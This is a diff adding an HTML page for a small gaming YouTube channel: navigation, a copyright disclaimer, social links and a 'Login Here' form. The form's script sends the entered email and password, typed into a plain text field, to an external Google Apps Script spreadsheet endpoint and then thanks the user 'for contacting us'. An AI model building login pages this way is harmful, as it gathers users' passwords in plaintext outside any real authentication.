@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Webpage Design</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <div class="main">
+        <div class="navbar">
+            <div class="icon">
+                <h2 class="logo">It's  Far Gaming</h2>
+            </div>
+
+            <div class="menu">
+                <ul>
+                    <li><a href="home.html">HOME</a></li>
+                    <li><a href="about.html">ABOUT</a></li>
+                    <li><a href="#">SERVICE</a></li>
+                    <li><a href="#">DESIGN</a></li>
+                    <li><a href="#">CONTACT</a></li>
+                </ul>
+            </div>
+
+            <div class="search">
+                <input class="srch" type="search" name="" placeholder="search your contents">
+                <a href="#"> <button class="btn">Search</button></a>
+            </div>
+
+        </div> 
+        <div class="content">
+            <h1>It’s Time For Chicken Dinner <br><span>Because it’s Far Yt</span> <br>About My Channel</h1>
+            <p class="par"> There is no copyright infringement intended for the song or picture.<br> 
+                If you have an issue with me posting this song or picture<br> please contact me through one of my social networks or YouTube 
+                private messaging system.<br>
+                 Once I have received your message and determined you are the proper owner of this content <br>
+                 I will it removed, no drama at all. <br>
+                 This channel is strictly for promotion towards the artists of the music.<br>
+                  I try to help promote their music and their social networks.. </p>
+
+                <button class="cn"onclick="window.location.href='https://www.youtube.com/channel/UCwVxGJQilnLbwnB7XCHcv1A?sub_confirmation=1'"><a href="#">SUBSCRIBE US</a></button>
+              
+
+                <div class="form">
+                    <form method="POST" name="google-sheet">
+                    <h2>Login Here</h2>
+                  
+                    <input type="text" placeholder="Email" id="password" name="Email">
+                    <input type="text" placeholder="Password" id="password" name="Password">
+                    <input type="submit" value="Login" name="submit">
+
+                    <p class="link">Don't have an account<br>
+                    <a href="#">Sign up </a> here</a></p>
+                    <p class="liw">Log in with</p>
+
+                    <div class="icons">
+                        <a href="https://www.youtube.com/channel/UCwVxGJQilnLbwnB7XCHcv1A?sub_confirmation=1"><ion-icon name="logo-youtube"></ion-icon></a>
+                        <a href="https://www.instagram.com/farinzi808/"><ion-icon name="logo-instagram"></ion-icon></a>
+                        <a href="https://www.facebook.com/profile.php?id=100061229622265"><ion-icon  name="logo-facebook"></ion-icon></a>
+                        <a href=""><ion-icon name="logo-whatsapp"></ion-icon></a>
+                        <a href="#"><ion-icon name="logo-google"></ion-icon></a>
+                        
+                        
+                    </div>
+
+                </div>
+                    </div>
+                </div>
+        </div>
+    </div>
+    <script>
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbxbICwYW3hM0wix4piFqWkIUuDbE132FWXfnCcfk6hRQs9M09jCrjSpqHQNyL107GdG3A/exec'
+        const form = document.forms['google-sheet']
+      
+        form.addEventListener('submit', e => {
+          e.preventDefault()
+          fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+            .then(response => alert("Thanks for Contacting us..! We Will Contact You Soon..."))
+            .catch(error => console.error('Error!', error.message))
+        })
+        </script>
+
+    <script src="https://unpkg.com/ionicons@5.4.0/dist/ionicons.js"></script>
+</body>
+</html>
+
+
+
+
